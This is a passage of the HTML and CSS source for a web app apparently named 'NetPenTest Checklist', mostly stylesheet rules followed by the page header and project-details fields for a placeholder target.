            background-image: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%23ffffff' fill-opacity='0.05' fill-rule='evenodd'/%3E%3C/svg%3E");
            opacity: 0.1;
            z-index: 0;
        }

        .back-button {
            color: var(--neutral-0);
            display: inline-flex;
            align-items: center;
            gap: var(--space-2);
            margin-bottom: var(--space-5);
            font-size: 0.9375rem;
            font-weight: 500;
            padding: var(--space-2) var(--space-4);
            background: rgba(255, 255, 255, 0.15);
            border-radius: var(--radius-lg);
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
            transition: all var(--transition-normal) var(--ease-out);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
            position: relative;
            z-index: 1;
            overflow: hidden;
        }

        .back-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.1);
            transform: translateX(-100%);
            transition: transform var(--transition-normal) var(--ease-out);
            z-index: -1;
        }

        .back-button:hover {
            background: rgba(255, 255, 255, 0.2);
            color: var(--neutral-0);
            transform: translateX(-4px);
        }

        .back-button:hover::before {
            transform: translateX(0);
        }

        .back-button i {
            transition: transform var(--transition-normal) var(--ease-bounce);
        }

        .back-button:hover i {
            transform: translateX(-4px);
        }

        .details-title {
            margin: 0 0 var(--space-2) 0;
            color: var(--neutral-0);
            font-size: 1.875rem;
            position: relative;
            z-index: 1;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        .details-subtitle {
            margin: 0;
            opacity: 0.9;
            font-weight: 400;
            font-size: 1.0625rem;
            position: relative;
            z-index: 1;
            max-width: 80%;
            line-height: 1.6;
        }

        .details-content {
            padding: var(--space-8);
        }

        .tab-nav {
            display: flex;
            margin-bottom: var(--space-8);
            gap: var(--space-2);
            border-bottom: 1px solid var(--neutral-200);
            padding-bottom: 1px;
            position: relative;
        }

        .tab-link {
            padding: var(--space-3) var(--space-5);
            font-weight: 500;
            font-size: 0.9375rem;
            color: var(--neutral-600);
            border-bottom: 3px solid transparent;
            margin-bottom: -1px;
            cursor: pointer;
            transition: all var(--transition-normal) var(--ease-out);
            position: relative;
            z-index: 1;
        }

        .tab-link:hover {
            color: var(--brand-yale);
        }

        .tab-link.active {
            color: var(--brand-cyan);
            border-bottom-color: var(--brand-cyan);
            font-weight: 600;
        }

        .tab-link.active::after {
            content: '';
            position: absolute;
            bottom: -3px;
            left: 0;
            right: 0;
            height: 3px;
            background-image: var(--gradient-highlight);
            border-radius: var(--radius-full);
        }

        /* Active tab indicator animation */
        .tab-link::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%) scale(0);
            width: 5px;
            height: 5px;
            background-color: var(--brand-cyan);
            border-radius: var(--radius-full);
            transition: transform var(--transition-normal) var(--ease-bounce);
            opacity: 0;
        }

        .tab-link:hover::before {
            transform: translateX(-50%) scale(1);
            opacity: 1;
        }

        .tab-link.active::before {
            opacity: 0;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
            animation: fadeIn var(--transition-normal) var(--ease-out);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* ====== CHECKLIST ITEMS ====== */
        .checklist-group {
            margin-bottom: var(--space-8);
            background-color: var(--neutral-0);
            border-radius: var(--radius-lg);
            box-shadow: var(--shadow-lg);
            border: 1px solid var(--neutral-200);
            overflow: hidden;
            position: relative;
        }

        .checklist-group-title {
            font-size: 1.125rem;
            padding: var(--space-4) var(--space-5);
            margin: 0;
            background-color: var(--neutral-100);
            border-bottom: 1px solid var(--neutral-200);
            display: flex;
            align-items: center;
            gap: var(--space-2);
            color: var(--neutral-900);
            font-weight: 600;
        }

        .checklist-group-title i {
            color: var(--brand-yale);
            font-size: 1rem;
        }

        .task-item {
            display: flex;
            align-items: flex-start;
            padding: var(--space-4) var(--space-5);
            transition: background-color var(--transition-normal) var(--ease-out);
            border-bottom: 1px solid var(--neutral-200);
            position: relative;
            overflow: hidden;
        }

        .task-item:last-child {
            border-bottom: none;
        }

        .task-item:hover {
            background-color: var(--neutral-100);
        }

        /* Task item hover effect */
        .task-item::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background-color: var(--brand-cyan);
            transform: translateX(-100%);
            transition: transform var(--transition-normal) var(--ease-out);
        }

        .task-item:hover::after {
            transform: translateX(0);
        }

        .task-status {
            margin-right: var(--space-3);
            flex-shrink: 0;
            margin-top: var(--space-1);
        }

        .status-controls {
            display: inline-flex;
            background-color: var(--neutral-200);
            border-radius: var(--radius-full);
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            padding: 2px;
        }

        .status-btn {
            border: none;
            background: none;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.875rem;
            cursor: pointer;
            transition: all var(--transition-normal) var(--ease-bounce);
            border-radius: var(--radius-full);
            margin: 0 1px;
            position: relative;
            overflow: hidden;
        }

        .status-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.1);
            transform: scale(0);
            transition: transform var(--transition-fast) var(--ease-out);
            border-radius: var(--radius-full);
        }

        .status-btn:hover::before {
            transform: scale(1);
        }

        .status-btn.active {
            background-color: var(--brand-cyan);
            color: var(--neutral-0);
            transform: scale(1.05);
            box-shadow: var(--shadow-sm);
        }

        .status-btn.na.active {
            background-color: var(--neutral-500);
        }

        .task-text {
            font-size: 0.9375rem;
            color: var(--neutral-800);
            line-height: 1.6;
            flex: 1;
            padding-top: var(--space-1);
        }

        /* ====== TECHNIQUES TAB ====== */
        .techniques-list {
            display: grid;
            grid-template-columns: 1fr;
            gap: var(--space-6);
        }

        .technique-item {
            background-color: var(--neutral-0);
            border-radius: var(--radius-lg);
            padding: var(--space-6);
            border-left: 5px solid var(--brand-yale);
            box-shadow: var(--shadow-lg);
            transition: all var(--transition-normal) var(--ease-bounce);
            position: relative;
            overflow: hidden;
        }

        .technique-item:hover {
            transform: var(--hover-lift-sm);
            box-shadow: var(--shadow-xl);
        }

        /* Technique item hover accent */
        .technique-item::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 5px;
            right: 0;
            height: 3px;
            background-image: var(--gradient-primary);
            transform: scaleX(0);
            transform-origin: left;
            transition: transform var(--transition-normal) var(--ease-bounce);
            border-radius: 0 0 var(--radius-lg) var(--radius-lg);
        }

        .technique-item:hover::after {
            transform: scaleX(1);
        }

        .technique-title {
            font-weight: 600;
            margin-bottom: var(--space-3);
            color: var(--brand-indigo);
            font-size: 1.1875rem;
            display: flex;
            align-items: center;
            gap: var(--space-2);
            position: relative;
        }

        .technique-title::before {
            content: '';
            display: inline-block;
            width: 8px;
            height: 8px;
            background-color: var(--brand-cyan);
            border-radius: var(--radius-full);
            margin-right: var(--space-2);
            box-shadow: 0 0 0 2px rgba(0, 180, 216, 0.3);
        }

        .technique-description {
            font-size: 0.9375rem;
            margin-bottom: var(--space-4);
            color: var(--neutral-700);
            line-height: 1.6;
        }

        pre.code-block {
            background-color: var(--neutral-900);
            color: var(--neutral-0);
            border-radius: var(--radius-lg);
            padding: var(--space-5);
            font-size: 0.875rem;
            overflow-x: auto;
            margin: var(--space-4) 0;
            font-family: 'Consolas', 'Courier New', monospace;
            box-shadow: var(--shadow-xl);
            line-height: 1.6;
            position: relative;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        pre.code-block::before {
            content: 'Code';
            position: absolute;
            top: 0;
            right: 0;
            background-color: rgba(255, 255, 255, 0.1);
            padding: 0.25rem 0.5rem;
            font-size: 0.75rem;
            border-radius: 0 var(--radius-lg) 0 var(--radius-md);
            color: rgba(255, 255, 255, 0.8);
            font-family: var(--font-body);
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
        }

        /* ====== TOOLS TAB ====== */
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: var(--space-5);
        }

        .tool-card {
            background-color: var(--neutral-0);
            border-radius: var(--radius-lg);
            padding: var(--space-5);
            transition: all var(--transition-normal) var(--ease-bounce);
            box-shadow: var(--shadow-lg);
            border: 1px solid rgba(0, 0, 0, 0.03);
            position: relative;
            overflow: hidden;
            transform-origin: center bottom;
        }

        .tool-card:hover {
            transform: var(--hover-lift);
            box-shadow: var(--shadow-2xl);
        }

        .tool-card::before {
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            width: 150px;
            height: 150px;
            background: linear-gradient(135deg, transparent 0%, rgba(0, 0, 0, 0.02) 100%);
            z-index: 0;
            border-radius: 0 0 0 150px;
        }

        .tool-header {
            display: flex;
            align-items: center;
            gap: var(--space-4);
            margin-bottom: var(--space-4);
            position: relative;
            z-index: 1;
        }

        .tool-icon {
            font-size: 1.375rem;
            color: var(--neutral-0);
            background-image: var(--gradient-primary);
            width: 3.25rem;
            height: 3.25rem;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: var(--radius-lg);
            box-shadow: var(--shadow-lg);
            position: relative;
            overflow: hidden;
        }

        .tool-icon::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255,255,255,0.25) 0%, rgba(255,255,255,0) 60%);
        }

        .tool-title {
            font-weight: 600;
            margin: 0;
            font-size: 1.125rem;
            color: var(--neutral-900);
        }

        .tool-description {
            font-size: 0.9375rem;
            color: var(--neutral-700);
            margin-bottom: var(--space-4);
            line-height: 1.6;
            position: relative;
            z-index: 1;
            min-height: 4.5rem;
        }

        .tool-link {
            display: inline-flex;
            align-items: center;
            gap: var(--space-2);
            font-size: 0.875rem;
            color: var(--neutral-0);
            font-weight: 600;
            padding: var(--space-2) var(--space-4);
            background-image: var(--gradient-primary);
            border-radius: var(--radius-full);
            transition: all var(--transition-normal) var(--ease-out);
            position: relative;
            z-index: 1;
            box-shadow: var(--shadow-md);
            overflow: hidden;
        }

        .tool-link::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.1);
            transform: translateX(-100%);
            transition: transform var(--transition-normal) var(--ease-out);
            z-index: -1;
        }

        .tool-link:hover {
            color: var(--neutral-0);
            box-shadow: var(--shadow-lg);
            padding-right: var(--space-5);
        }

        .tool-link:hover::before {
            transform: translateX(0);
        }

        .tool-link i {
            font-size: 0.75rem;
            transition: transform var(--transition-normal) var(--ease-bounce);
        }

        .tool-link:hover i {
            transform: translateX(4px);
        }

        /* ====== NOTES TAB ====== */
        .notes-form {
            margin-bottom: var(--space-6);
        }

        .form-label {
            display: block;
            margin-bottom: var(--space-3);
            font-weight: 500;
            font-size: 0.9375rem;
            color: var(--neutral-800);
        }

        .notes-textarea {
            width: 100%;
            min-height: 260px;
            padding: var(--space-4);
            border: 1px solid var(--neutral-300);
            border-radius: var(--radius-lg);
            resize: vertical;
            font-family: inherit;
            font-size: 0.9375rem;
            margin-bottom: var(--space-5);
            transition: all var(--transition-normal) var(--ease-out);
            line-height: 1.6;
            box-shadow: var(--shadow-inner);
            color: var(--neutral-800);
        }

        .notes-textarea:focus {
            outline: none;
            border-color: var(--brand-aqua);
            box-shadow: 0 0 0 3px rgba(0, 180, 216, 0.15), var(--shadow-inner);
        }

        /* ====== FINDINGS SECTION ====== */
        .findings-section {
            margin-bottom: var(--space-12);
        }

        .findings-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--space-6);
        }

        .findings-header h2 {
            margin-bottom: 0;
            position: relative;
            padding-bottom: var(--space-3);
        }

        .findings-header h2::after {
            content: "";
            position: absolute;
            bottom: 0;
            left: 0;
            height: 4px;
            width: 3.5rem;
            background-image: var(--gradient-primary);
            border-radius: var(--radius-full);
        }

        .header-actions {
            display: flex;
            gap: var(--space-3);
        }

        .findings-table-container {
            background-color: var(--neutral-0);
            border-radius: var(--radius-xl);
            overflow: hidden;
            box-shadow: var(--shadow-xl);
            border: var(--card-border-width) solid rgba(0, 0, 0, 0.04);
        }

        .findings-table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
            font-size: 0.9375rem;
        }

        .findings-table th, 
        .findings-table td {
            padding: var(--space-4) var(--space-5);
        }

        .findings-table th {
            background-color: var(--neutral-100);
            font-weight: 600;
            font-size: 0.875rem;
            color: var(--neutral-800);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            border-bottom: 2px solid var(--brand-cyan);
            position: relative;
        }

        .findings-table th::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            right: 0;
            height: 2px;
            background-image: var(--gradient-primary);
            transform: scaleX(0);
            transform-origin: left;
            transition: transform var(--transition-normal) var(--ease-out);
        }

        .findings-table th:hover::after {
            transform: scaleX(1);
        }

        .findings-table tbody tr {
            border-bottom: 1px solid var(--neutral-200);
            transition: all var(--transition-normal) var(--ease-out);
        }

        .findings-table tbody tr:hover {
            background-color: var(--neutral-100);
        }

        .findings-table tbody tr:last-child {
            border-bottom: none;
        }

        .count-high {
            color: var(--status-high);
            font-weight: 600;
        }

        .count-medium {
            color: var(--status-medium-hover);
            font-weight: 600;
        }

        .count-low {
            color: var(--status-low);
            font-weight: 600;
        }

        .findings-actions {
            display: flex;
            gap: var(--space-2);
        }

        .action-btn {
            color: var(--brand-yale);
            background: none;
            border: none;
            cursor: pointer;
            font-size: 0.875rem;
            display: inline-flex;
            align-items: center;
            gap: var(--space-2);
            transition: all var(--transition-normal) var(--ease-out);
            padding: var(--space-2) var(--space-3);
            border-radius: var(--radius-md);
        }

        .action-btn:hover {
            color: var(--brand-cyan);
            background-color: var(--status-info-bg);
        }

        .action-btn i {
            font-size: 0.8125rem;
            transition: transform var(--transition-normal) var(--ease-bounce);
        }

        .action-btn:hover i {
            transform: translateY(-2px);
        }

        /* ====== MODALS ====== */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(15, 23, 42, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: var(--z-modal-backdrop);
            opacity: 0;
            visibility: hidden;
            transition: all var(--transition-normal) var(--ease-out);
            backdrop-filter: var(--glass-blur);
            -webkit-backdrop-filter: var(--glass-blur);
        }

        .modal-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .modal {
            background-color: var(--neutral-0);
            border-radius: var(--radius-xl);
            width: 100%;
            max-width: 650px;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: var(--shadow-2xl);
            transform: translateY(30px) scale(0.95);
            transition: all var(--transition-normal) var(--ease-bounce);
            position: relative;
            z-index: var(--z-modal);
            border: var(--card-border-width) solid rgba(255, 255, 255, 0.1);
        }

        .modal-overlay.active .modal {
            transform: translateY(0) scale(1);
        }

        .modal-header {
            padding: var(--space-5) var(--space-6);
            border-bottom: 1px solid var(--neutral-200);
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: var(--neutral-100);
            border-radius: var(--radius-xl) var(--radius-xl) 0 0;
            position: relative;
            overflow: hidden;
        }

        .modal-header::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background-image: var(--gradient-primary);
        }

        .modal-title {
            font-size: 1.375rem;
            margin: 0;
            color: var(--neutral-900);
            position: relative;
        }

        .modal-close {
            background: none;
            border: none;
            font-size: 1.25rem;
            cursor: pointer;
            color: var(--neutral-500);
            transition: all var(--transition-normal) var(--ease-out);
            width: 2.5rem;
            height: 2.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: var(--radius-full);
            position: relative;
            overflow: hidden;
        }

        .modal-close::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.05);
            transform: scale(0);
            transition: transform var(--transition-normal) var(--ease-out);
            border-radius: var(--radius-full);
        }

        .modal-close:hover {
            color: var(--status-critical);
        }

        .modal-close:hover::before {
            transform: scale(1);
        }

        .modal-body {
            padding: var(--space-6);
        }

        .modal-footer {
            padding: var(--space-5) var(--space-6);
            border-top: 1px solid var(--neutral-200);
            display: flex;
            justify-content: flex-end;
            gap: var(--space-3);
            background-color: var(--neutral-100);
            border-radius: 0 0 var(--radius-xl) var(--radius-xl);
        }

        /* ====== FORMS ====== */
        .form-group {
            margin-bottom: var(--space-5);
        }

        .form-control {
            width: 100%;
            padding: var(--space-3) var(--space-4);
            font-size: 0.9375rem;
            border: 1px solid var(--neutral-300);
            border-radius: var(--radius-lg);
            transition: all var(--transition-normal) var(--ease-out);
            font-family: inherit;
            background-color: var(--neutral-0);
            box-shadow: var(--shadow-inner);
            color: var(--neutral-800);
        }

        .form-control:focus {
            outline: none;
            border-color: var(--brand-aqua);
            box-shadow: 0 0 0 3px rgba(0, 180, 216, 0.15), var(--shadow-inner);
        }

        select.form-control {
            appearance: none;
            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='none' stroke='%2364748b' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M2 5l6 6 6-6'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 0.85rem center;
            background-size: 16px 12px;
            padding-right: 2.5rem;
        }

        textarea.form-control {
            min-height: 120px;
            resize: vertical;
            line-height: 1.6;
        }

        /* ====== TOAST NOTIFICATIONS ====== */
        .toast-container {
            position: fixed;
            bottom: var(--space-6);
            right: var(--space-6);
            z-index: var(--z-tooltip);
        }

        .toast {
            padding: var(--space-4) var(--space-5);
            border-radius: var(--radius-lg);
            background-color: var(--brand-yale);
            color: var(--neutral-0);
            margin-top: var(--space-3);
            box-shadow: var(--shadow-xl);
            display: flex;
            align-items: center;
            transform: translateX(100%);
            opacity: 0;
            transition: all var(--transition-slow) var(--ease-bounce);
            max-width: 350px;
            border-left: 5px solid rgba(0, 0, 0, 0.1);
            position: relative;
            overflow: hidden;
        }

        .toast.show {
            transform: translateX(0);
            opacity: 1;
        }

        .toast::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background-color: rgba(255, 255, 255, 0.3);
            animation: toast-timer 5s linear forwards;
            transform-origin: left;
        }

        @keyframes toast-timer {
            0% { transform: scaleX(1); }
            100% { transform: scaleX(0); }
        }

        .toast-success {
            background-color: var(--status-success);
        }

        .toast-error {
            background-color: var(--status-critical);
        }

        .toast-warning {
            background-color: var(--status-high);
        }

        .toast-info {
            background-color: var(--status-info);
        }

        .toast-icon {
            margin-right: var(--space-3);
            font-size: 1.375rem;
        }

        .toast-message {
            font-weight: 500;
            flex: 1;
        }

        /* ====== FOOTER ====== */
        .app-footer {
            background-color: var(--brand-prussian);
            color: rgba(255, 255, 255, 0.8);
            padding: var(--space-12) 0 var(--space-8);
            margin-top: var(--space-16);
            position: relative;
            overflow: hidden;
        }

        .app-footer::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.05'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
        }

        .footer-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: var(--space-8);
            position: relative;
        }

        .footer-brand h3 {
            color: var(--neutral-0);
            margin-bottom: var(--space-4);
            font-size: 1.5rem;
            position: relative;
            display: inline-block;
            padding-bottom: var(--space-3);
        }

        .footer-brand h3::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 40px;
            height: 3px;
            background-color: var(--brand-cyan);
            border-radius: var(--radius-full);
        }

        .footer-brand p {
            font-size: 0.9375rem;
            opacity: 0.9;
            line-height: 1.7;
        }

        .footer-links h4 {
            color: var(--neutral-0);
            margin-bottom: var(--space-4);
            font-size: 1.125rem;
            position: relative;
            display: inline-block;
            padding-bottom: var(--space-2);
        }

        .footer-links h4::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 30px;
            height: 3px;
            background-color: var(--brand-cyan);
            border-radius: var(--radius-full);
        }

        .footer-links ul {
            list-style: none;
            padding: 0;
        }

        .footer-links li {
            margin-bottom: var(--space-3);
        }

        .footer-links a {
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9375rem;
            transition: all var(--transition-normal) var(--ease-out);
            display: inline-flex;
            align-items: center;
            gap: var(--space-2);
            position: relative;
            padding-left: var(--space-4);
        }

        .footer-links a::before {
            content: '';
            position: absolute;
            left: 0;
            top: 50%;
            transform: translateY(-50%);
            width: 6px;
            height: 6px;
            background-color: var(--brand-cyan);
            border-radius: var(--radius-full);
            transition: all var(--transition-normal) var(--ease-bounce);
        }

        .footer-links a:hover {
            color: var(--neutral-0);
            transform: translateX(4px);
        }

        .footer-links a:hover::before {
            background-color: var(--brand-aqua);
            transform: translateY(-50%) scale(1.5);
        }

        .footer-links a i {
            font-size: 0.8125rem;
            opacity: 0.8;
        }

        .footer-bottom {
            text-align: center;
            padding-top: var(--space-8);
            margin-top: var(--space-8);
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            font-size: 0.875rem;
            opacity: 0.7;
            position: relative;
        }

        /* ====== DASHBOARD STYLES ====== */
        .metric-card {
            background-color: var(--neutral-0);
            border-radius: var(--radius-xl);
            box-shadow: var(--shadow-xl);
            padding: var(--space-6);
            flex: 1;
            min-width: 200px;
            transition: all var(--transition-normal) var(--ease-bounce);
            border: var(--card-border-width) solid rgba(0,0,0,0.04);
            position: relative;
            overflow: hidden;
            transform-origin: center bottom;
        }

        .metric-card:hover {
            transform: var(--hover-lift);
            box-shadow: var(--shadow-2xl);
        }

        .metric-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 6px;
            height: 100%;
            background-image: var(--gradient-primary);
        }

        .dashboard-metrics-row {
            display: flex;
            flex-wrap: wrap;
            gap: var(--space-5);
            margin-bottom: var(--space-6);
        }

        .metric-content h4 {
            font-size: 1.125rem;
            margin-bottom: var(--space-3);
            color: var(--neutral-900);
            display: flex;
            align-items: center;
            gap: var(--space-2);
        }

        .metric-content h4 i {
            color: var(--brand-yale);
            font-size: 1rem;
        }

        .metric-content p {
            margin-bottom: var(--space-2);
            font-size: 0.9375rem;
            line-height: 1.6;
        }

        .metric-content strong {
            color: var(--brand-indigo);
        }

        /* ====== PRINT STYLES ====== */
        @media print {
            .no-print {
                display: none !important;
            }

            body {
                background-color: var(--neutral-0);
                font-size: 12pt;
            }

            .container {
                width: 100%;
                max-width: 100%;
                padding: 0;
            }

            .category-details {
                break-inside: avoid;
                box-shadow: none;
                border: 1px solid #ddd;
            }

            .task-item {
                break-inside: avoid;
            }

            /* Make colors print properly */
            .priority-critical,
            .priority-high,
            .priority-medium,
            .priority-low {
                border-left-width: 8px;
                border-left-style: solid;
            }

            .priority-critical {
                border-left-color: var(--status-critical);
            }

            .priority-high {
                border-left-color: var(--status-high);
            }

            .priority-medium {
                border-left-color: var(--status-medium);
            }

            .priority-low {
                border-left-color: var(--status-low);
            }
        }

        /* ====== RESPONSIVE ADJUSTMENTS ====== */
        @media (max-width: 992px) {
            .progress-grid,
            .categories-grid,
            .tools-grid {
                grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
                gap: var(--space-5);
            }
            
            .details-header {
                padding: var(--space-6);
            }
            
            .project-info {
                padding: var(--space-6);
            }
        }

        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: var(--space-4);
                text-align: center;
                padding: var(--space-3) 0;
            }

            .logo {
                justify-content: center;
            }

            .header-actions {
                justify-content: center;
                flex-wrap: wrap;
            }

            .project-info-header {
                flex-direction: column;
                gap: var(--space-4);
                align-items: flex-start;
            }

            .project-details {
                grid-template-columns: 1fr;
            }

            .findings-header {
                flex-direction: column;
                gap: var(--space-4);
                align-items: flex-start;
            }

            .findings-table th:nth-child(4),
            .findings-table td:nth-child(4),
.findings-table th:nth-child(5),
            .findings-table td:nth-child(5) {
                display: none;
            }
            
            .details-title {
                font-size: 1.625rem;
            }
            
            .categories-grid {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 576px) {
            .container {
                padding: 0 var(--space-4);
            }
            
            .btn {
                padding: 0.5rem 0.875rem;
                font-size: 0.875rem;
            }

            .progress-grid,
            .categories-grid,
            .tools-grid {
                grid-template-columns: 1fr;
                gap: var(--space-4);
            }

            .tab-nav {
                flex-wrap: wrap;
            }

            .tab-link {
                flex: 1 0 auto;
                text-align: center;
                padding: var(--space-3) var(--space-2);
                font-size: 0.875rem;
            }
            
            .details-header {
                padding: var(--space-5);
            }
            
            .details-content {
                padding: var(--space-5);
            }
            
            .findings-table th, 
            .findings-table td {
                padding: var(--space-3);
                font-size: 0.875rem;
            }
            
            .logo h1 {
                font-size: 1.5rem;
            }
            
            .logo-icon {
                width: 3rem;
                height: 3rem;
                font-size: 1.8rem;
            }
            
            .toast-container {
                left: var(--space-4);
                right: var(--space-4);
                bottom: var(--space-4);
            }
            
            .toast {
                max-width: 100%;
            }
            
            .project-info,
            .category-details {
                border-radius: var(--radius-lg);
                padding: var(--space-5);
            }
            
            .modal {
                width: 95%;
                border-radius: var(--radius-lg);
            }
            
            .modal-header,
            .modal-body,
            .modal-footer {
                padding: var(--space-4);
            }
        }
    </style>
<script src="https://cdn.jsdelivr.net/npm/chart.js@3.7.1/dist/chart.min.js"></script><script src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js"></script></head>

<body>
    <!-- Header -->
    <header class="app-header no-print">
        <div class="container">
            <div class="header-content">
                <div class="logo">
                    <div class="logo-icon">
                        <i class="fas fa-shield-alt"></i>
                    </div>
                    <div class="logo-text">
                        <h1>NetPenTest Checklist</h1>
                        <span>Comprehensive Network Penetration Testing Framework</span>
                    </div>
                </div>
                <div class="header-actions">
                    <button id="btn-projects" class="btn btn-outline">
                        <i class="fas fa-folder"></i>
                        <span>Projects</span>
                    </button>
                    <button id="btn-dashboard" class="btn btn-outline">
                        <i class="fas fa-chart-line"></i>
                        <span>Dashboard</span>
                    </button>
                    <button id="btn-print" class="btn btn-outline">
                        <i class="fas fa-print"></i>
                        <span>Print</span>
                    </button>
                    <button id="btn-export" class="btn btn-outline">
                        <i class="fas fa-file-export"></i>
                        <span>Export</span>
                    </button>
                    <button id="btn-import" class="btn btn-outline">
                        <i class="fas fa-file-import"></i>
                        <span>Import</span>
                    </button>
                </div>
            </div>
        </div>
    </header>

    <main class="container">
        <!-- Project Info Section -->
        <section class="project-info">
            <div class="project-info-header">
                <h2 id="project-name">Default Network Pentest1</h2>
                <button id="btn-edit-project" class="btn btn-sm btn-primary">
                    <i class="fas fa-edit"></i>
                    <span>Edit Details</span>
                </button>
            </div>
            <div class="project-details">
                <div class="project-detail-item">
                    <dt><i class="fas fa-globe"></i> Target</dt>
                    <dd id="project-target">example.com</dd>
                </div>
                <div class="project-detail-item">
                    <dt><i class="fas fa-calendar-alt"></i> Start Date</dt>
                    <dd id="project-date">4/13/2025</dd>
                </div>
                <div class="project-detail-item">
                    <dt><i class="fas fa-user-shield"></i> Lead Tester</dt>
                    <dd id="project-tester">Security Tester</dd>
                </div>
                <div class="project-detail-item">
                    <dt><i class="fas fa-history"></i> Last Updated</dt>
                    <dd id="project-updated">5/8/2025</dd>
                </div>
                <div class="project-detail-item">
                    <dt><i class="fas fa-bullseye"></i> Scope</dt>
